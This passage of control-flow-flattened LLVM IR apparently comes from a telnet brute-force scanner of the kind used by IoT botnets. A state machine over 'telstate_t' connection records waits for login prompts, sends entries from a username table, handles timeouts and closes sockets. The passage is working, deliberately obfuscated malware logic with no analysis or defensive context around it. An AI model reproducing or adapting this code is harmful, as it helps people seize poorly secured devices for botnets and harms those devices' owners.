  %532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %531, i32 0, i32 8
  %533 = load i8*, i8** %532, align 8
  call void @llvm.memset.p0i8.i64(i8* %533, i8 0, i64 1024, i32 1, i1 false)
  store i32 1842975591, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load i32, i32* %2, align 4
  %536 = sext i32 %535 to i64
  %.reload334 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload334, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 2
  store i8 3, i8* %538, align 8
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i32, i32* %2, align 4
  %541 = sext i32 %540 to i64
  %.reload333 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload333, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 0
  %544 = load i32, i32* %543, align 16
  %545 = load i32, i32* %2, align 4
  %546 = sext i32 %545 to i64
  %.reload332 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload332, i64 %546
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %547, i32 0, i32 8
  %549 = load i8*, i8** %548, align 8
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %.reload331 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload331, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 7
  %554 = load i16, i16* %553, align 16
  %555 = zext i16 %554 to i32
  %556 = call i32 @readUntil(i32 %544, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %549, i32 1024, i32 %555)
  %557 = icmp ne i32 %556, 0
  %558 = select i1 %557, i32 -466763244, i32 -292905141
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i32, i32* %2, align 4
  %561 = sext i32 %560 to i64
  %.reload330 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload330, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 6
  store i32 0, i32* %563, align 4
  %564 = load i32, i32* %2, align 4
  %565 = sext i32 %564 to i64
  %.reload329 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload329, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 7
  store i16 0, i16* %567, align 16
  %568 = load i32, i32* %2, align 4
  %569 = sext i32 %568 to i64
  %.reload328 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload328, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 8
  %572 = load i8*, i8** %571, align 8
  %573 = call i8* @strstr(i8* %572, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %574 = icmp ne i8* %573, null
  %575 = select i1 %574, i32 2103773866, i32 -799026987
  store i32 %575, i32* %switchVar
  br label %loopEnd

; <label>:576:                                    ; preds = %loopEntry
  %577 = load i32, i32* %2, align 4
  %578 = sext i32 %577 to i64
  %.reload327 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload327, i64 %578
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %579, i32 0, i32 2
  store i8 5, i8* %580, align 8
  store i32 -902863604, i32* %switchVar
  br label %loopEnd

; <label>:581:                                    ; preds = %loopEntry
  %582 = load i32, i32* %2, align 4
  %583 = sext i32 %582 to i64
  %.reload326 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload326, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 8
  %586 = load i8*, i8** %585, align 8
  call void @llvm.memset.p0i8.i64(i8* %586, i8 0, i64 1024, i32 1, i1 false)
  store i32 -902863604, i32* %switchVar
  br label %loopEnd

; <label>:587:                                    ; preds = %loopEntry
  %588 = load i32, i32* %2, align 4
  %589 = sext i32 %588 to i64
  %.reload325 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload325, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 2
  store i8 3, i8* %591, align 8
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = load i32, i32* %2, align 4
  %594 = sext i32 %593 to i64
  %.reload324 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload324, i64 %594
  %596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %595, i32 0, i32 0
  %597 = load i32, i32* %596, align 16
  %598 = load i32, i32* %2, align 4
  %599 = sext i32 %598 to i64
  %.reload323 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload323, i64 %599
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %600, i32 0, i32 8
  %602 = load i8*, i8** %601, align 8
  %603 = load i32, i32* %2, align 4
  %604 = sext i32 %603 to i64
  %.reload322 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload322, i64 %604
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %605, i32 0, i32 7
  %607 = load i16, i16* %606, align 16
  %608 = zext i16 %607 to i32
  %609 = call i32 @readUntil(i32 %597, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %602, i32 1024, i32 %608)
  %610 = icmp ne i32 %609, 0
  %611 = select i1 %610, i32 -1161289985, i32 1673111712
  store i32 %611, i32* %switchVar
  br label %loopEnd

; <label>:612:                                    ; preds = %loopEntry
  %613 = load i32, i32* %2, align 4
  %614 = sext i32 %613 to i64
  %.reload321 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload321, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 6
  store i32 0, i32* %616, align 4
  %617 = load i32, i32* %2, align 4
  %618 = sext i32 %617 to i64
  %.reload320 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload320, i64 %618
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %619, i32 0, i32 7
  store i16 0, i16* %620, align 16
  %621 = load i32, i32* %2, align 4
  %622 = sext i32 %621 to i64
  %.reload319 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload319, i64 %622
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %623, i32 0, i32 8
  %625 = load i8*, i8** %624, align 8
  %626 = call i8* @strstr(i8* %625, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %627 = icmp ne i8* %626, null
  %628 = select i1 %627, i32 51205623, i32 2124748698
  store i32 %628, i32* %switchVar
  br label %loopEnd

; <label>:629:                                    ; preds = %loopEntry
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %.reload318 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload318, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 2
  store i8 5, i8* %633, align 8
  store i32 350853082, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = load i32, i32* %2, align 4
  %636 = sext i32 %635 to i64
  %.reload317 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload317, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %637, i32 0, i32 8
  %639 = load i8*, i8** %638, align 8
  call void @llvm.memset.p0i8.i64(i8* %639, i8 0, i64 1024, i32 1, i1 false)
  store i32 350853082, i32* %switchVar
  br label %loopEnd

; <label>:640:                                    ; preds = %loopEntry
  %641 = load i32, i32* %2, align 4
  %642 = sext i32 %641 to i64
  %.reload316 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload316, i64 %642
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %643, i32 0, i32 2
  store i8 3, i8* %644, align 8
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  %646 = load i32, i32* %2, align 4
  %647 = sext i32 %646 to i64
  %.reload315 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload315, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 0
  %650 = load i32, i32* %649, align 16
  %651 = load i32, i32* %2, align 4
  %652 = sext i32 %651 to i64
  %.reload314 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload314, i64 %652
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %653, i32 0, i32 8
  %655 = load i8*, i8** %654, align 8
  %656 = load i32, i32* %2, align 4
  %657 = sext i32 %656 to i64
  %.reload313 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload313, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 7
  %660 = load i16, i16* %659, align 16
  %661 = zext i16 %660 to i32
  %662 = call i32 @readUntil(i32 %650, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %655, i32 1024, i32 %661)
  %663 = icmp ne i32 %662, 0
  %664 = select i1 %663, i32 -1138158094, i32 624689209
  store i32 %664, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i32, i32* %2, align 4
  %667 = sext i32 %666 to i64
  %.reload312 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload312, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 6
  store i32 0, i32* %669, align 4
  %670 = load i32, i32* %2, align 4
  %671 = sext i32 %670 to i64
  %.reload311 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload311, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 7
  store i16 0, i16* %673, align 16
  %674 = load i32, i32* %2, align 4
  %675 = sext i32 %674 to i64
  %.reload310 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload310, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 8
  %678 = load i8*, i8** %677, align 8
  %679 = call i8* @strstr(i8* %678, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %680 = icmp ne i8* %679, null
  %681 = select i1 %680, i32 899629215, i32 1192251807
  store i32 %681, i32* %switchVar
  br label %loopEnd

; <label>:682:                                    ; preds = %loopEntry
  %683 = load i32, i32* %2, align 4
  %684 = sext i32 %683 to i64
  %.reload309 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload309, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 2
  store i8 5, i8* %686, align 8
  store i32 1153686782, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* %2, align 4
  %689 = sext i32 %688 to i64
  %.reload308 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload308, i64 %689
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %690, i32 0, i32 8
  %692 = load i8*, i8** %691, align 8
  call void @llvm.memset.p0i8.i64(i8* %692, i8 0, i64 1024, i32 1, i1 false)
  store i32 1153686782, i32* %switchVar
  br label %loopEnd

; <label>:693:                                    ; preds = %loopEntry
  %694 = load i32, i32* %2, align 4
  %695 = sext i32 %694 to i64
  %.reload307 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload307, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 2
  store i8 3, i8* %697, align 8
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:698:                                    ; preds = %loopEntry
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %.reload306 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload306, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 8
  %703 = load i8*, i8** %702, align 8
  %704 = call i64 @strlen(i8* %703) #10
  %705 = trunc i64 %704 to i16
  %706 = load i32, i32* %2, align 4
  %707 = sext i32 %706 to i64
  %.reload305 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload305, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 7
  store i16 %705, i16* %709, align 16
  store i32 -1323941909, i32* %switchVar
  br label %loopEnd

; <label>:710:                                    ; preds = %loopEntry
  store i32 229830336, i32* %switchVar
  br label %loopEnd

; <label>:711:                                    ; preds = %loopEntry
  store i32 -112986746, i32* %switchVar
  br label %loopEnd

; <label>:712:                                    ; preds = %loopEntry
  store i32 1869441271, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  store i32 -1694989014, i32* %switchVar
  br label %loopEnd

; <label>:714:                                    ; preds = %loopEntry
  %715 = load i32, i32* %2, align 4
  %716 = sext i32 %715 to i64
  %.reload304 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload304, i64 %716
  %718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %717, i32 0, i32 6
  %719 = load i32, i32* %718, align 4
  %720 = add i32 %719, 10
  %721 = zext i32 %720 to i64
  %722 = call i64 @time(i64* null) #2
  %723 = icmp slt i64 %721, %722
  %724 = select i1 %723, i32 1593440785, i32 -137540645
  store i32 %724, i32* %switchVar
  br label %loopEnd

; <label>:725:                                    ; preds = %loopEntry
  %726 = load i32, i32* %2, align 4
  %727 = sext i32 %726 to i64
  %.reload303 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload303, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 0
  %730 = load i32, i32* %729, align 16
  %731 = call i32 @sclose(i32 %730)
  %732 = load i32, i32* %2, align 4
  %733 = sext i32 %732 to i64
  %.reload302 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload302, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 2
  store i8 0, i8* %735, align 8
  %736 = load i32, i32* %2, align 4
  %737 = sext i32 %736 to i64
  %.reload301 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload301, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 3
  store i8 1, i8* %739, align 1
  store i32 -137540645, i32* %switchVar
  br label %loopEnd

; <label>:740:                                    ; preds = %loopEntry
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  %742 = load i32, i32* %2, align 4
  %743 = sext i32 %742 to i64
  %.reload300 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload300, i64 %743
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %744, i32 0, i32 0
  %746 = load i32, i32* %745, align 16
  %747 = load i32, i32* %2, align 4
  %748 = sext i32 %747 to i64
  %.reload299 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload299, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 4
  %751 = load i8, i8* %750, align 2
  %752 = zext i8 %751 to i64
  %753 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %752
  %754 = load i8*, i8** %753, align 8
  %755 = load i32, i32* %2, align 4
  %756 = sext i32 %755 to i64
  %.reload298 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload298, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 4
  %759 = load i8, i8* %758, align 2
  %760 = zext i8 %759 to i64
  %761 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %760
  %762 = load i8*, i8** %761, align 8
  %763 = call i64 @strlen(i8* %762) #10
  %764 = call i64 @send(i32 %746, i8* %754, i64 %763, i32 16384)
  %765 = icmp slt i64 %764, 0
  %766 = select i1 %765, i32 2129087009, i32 9968878
  store i32 %766, i32* %switchVar
  br label %loopEnd

; <label>:767:                                    ; preds = %loopEntry
  %768 = load i32, i32* %2, align 4
  %769 = sext i32 %768 to i64
  %.reload297 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload297, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 0
  %772 = load i32, i32* %771, align 16
  %773 = call i32 @sclose(i32 %772)
  %774 = load i32, i32* %2, align 4
  %775 = sext i32 %774 to i64
  %.reload296 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload296, i64 %775
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %776, i32 0, i32 2
  store i8 0, i8* %777, align 8
  %778 = load i32, i32* %2, align 4
  %779 = sext i32 %778 to i64
  %.reload295 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload295, i64 %779
  %781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %780, i32 0, i32 3
  store i8 1, i8* %781, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  %783 = load i32, i32* %2, align 4
  %784 = sext i32 %783 to i64
  %.reload294 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload294, i64 %784
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %785, i32 0, i32 0
  %787 = load i32, i32* %786, align 16
  %788 = call i64 @send(i32 %787, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %789 = icmp slt i64 %788, 0
  %790 = select i1 %789, i32 -1053843084, i32 -259676276
  store i32 %790, i32* %switchVar
  br label %loopEnd

; <label>:791:                                    ; preds = %loopEntry
  %792 = load i32, i32* %2, align 4
  %793 = sext i32 %792 to i64
  %.reload293 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload293, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 0
  %796 = load i32, i32* %795, align 16
  %797 = call i32 @sclose(i32 %796)
  %798 = load i32, i32* %2, align 4
  %799 = sext i32 %798 to i64
  %.reload292 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload292, i64 %799
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %800, i32 0, i32 2
  store i8 0, i8* %801, align 8
  %802 = load i32, i32* %2, align 4
  %803 = sext i32 %802 to i64
  %.reload291 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload291, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 3
  store i8 1, i8* %805, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:806:                                    ; preds = %loopEntry
  %807 = load i32, i32* %2, align 4
  %808 = sext i32 %807 to i64
  %.reload290 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload290, i64 %808
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %809, i32 0, i32 2
  store i8 4, i8* %810, align 8
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:811:                                    ; preds = %loopEntry
  %812 = load i32, i32* %2, align 4
  %813 = sext i32 %812 to i64
  %.reload289 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload289, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 6
  %816 = load i32, i32* %815, align 4
  %817 = icmp eq i32 %816, 0
  %818 = select i1 %817, i32 1599564283, i32 85093915
  store i32 %818, i32* %switchVar
  br label %loopEnd

; <label>:819:                                    ; preds = %loopEntry
  %820 = call i64 @time(i64* null) #2
  %821 = trunc i64 %820 to i32
  %822 = load i32, i32* %2, align 4
  %823 = sext i32 %822 to i64
  %.reload288 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload288, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 6
  store i32 %821, i32* %825, align 4
  store i32 85093915, i32* %switchVar
  br label %loopEnd

; <label>:826:                                    ; preds = %loopEntry
  %827 = load i32, i32* %2, align 4
  %828 = sext i32 %827 to i64
  %.reload287 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload287, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 0
  %831 = load i32, i32* %830, align 16
  %832 = load i32, i32* %2, align 4
  %833 = sext i32 %832 to i64
  %.reload286 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload286, i64 %833
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %834, i32 0, i32 8
  %836 = load i8*, i8** %835, align 8
  %837 = load i32, i32* %2, align 4
  %838 = sext i32 %837 to i64
  %.reload285 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload285, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 7
  %841 = load i16, i16* %840, align 16
  %842 = zext i16 %841 to i32
  %843 = call i32 @readUntil(i32 %831, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %836, i32 1024, i32 %842)
  %844 = icmp ne i32 %843, 0
  %845 = select i1 %844, i32 1068537333, i32 734474005
  store i32 %845, i32* %switchVar
  br label %loopEnd

; <label>:846:                                    ; preds = %loopEntry
  %847 = load i32, i32* %2, align 4
  %848 = sext i32 %847 to i64
  %.reload284 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload284, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 6
  store i32 0, i32* %850, align 4
  %851 = load i32, i32* %2, align 4
  %852 = sext i32 %851 to i64
  %.reload283 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload283, i64 %852
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %853, i32 0, i32 7
  store i16 0, i16* %854, align 16
  %855 = load i32, i32* %2, align 4
  %856 = sext i32 %855 to i64
  %.reload282 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload282, i64 %856
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %857, i32 0, i32 8
  %859 = load i8*, i8** %858, align 8
  %860 = call i8* @strstr(i8* %859, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0)) #10
  %861 = icmp ne i8* %860, null
  %862 = select i1 %861, i32 2066269078, i32 -2041809177
  store i32 %862, i32* %switchVar
  br label %loopEnd

; <label>:863:                                    ; preds = %loopEntry
  %864 = load i32, i32* %2, align 4
  %865 = sext i32 %864 to i64
  %.reload281 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload281, i64 %865
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %866, i32 0, i32 2
  store i8 5, i8* %867, align 8
  store i32 -1672235888, i32* %switchVar
  br label %loopEnd

; <label>:868:                                    ; preds = %loopEntry
  %869 = load i32, i32* %2, align 4
  %870 = sext i32 %869 to i64
  %.reload280 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload280, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 2
  store i8 7, i8* %872, align 8
  store i32 -1672235888, i32* %switchVar
  br label %loopEnd

; <label>:873:                                    ; preds = %loopEntry
  %874 = load i32, i32* %2, align 4
  %875 = sext i32 %874 to i64
  %.reload279 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload279, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 8
  %878 = load i8*, i8** %877, align 8
  call void @llvm.memset.p0i8.i64(i8* %878, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:879:                                    ; preds = %loopEntry
  %880 = load i32, i32* %2, align 4
  %881 = sext i32 %880 to i64
  %.reload278 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload278, i64 %881
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %882, i32 0, i32 0
  %884 = load i32, i32* %883, align 16
  %885 = load i32, i32* %2, align 4
  %886 = sext i32 %885 to i64
  %.reload277 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload277, i64 %886
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %887, i32 0, i32 8
  %889 = load i8*, i8** %888, align 8
  %890 = load i32, i32* %2, align 4
  %891 = sext i32 %890 to i64
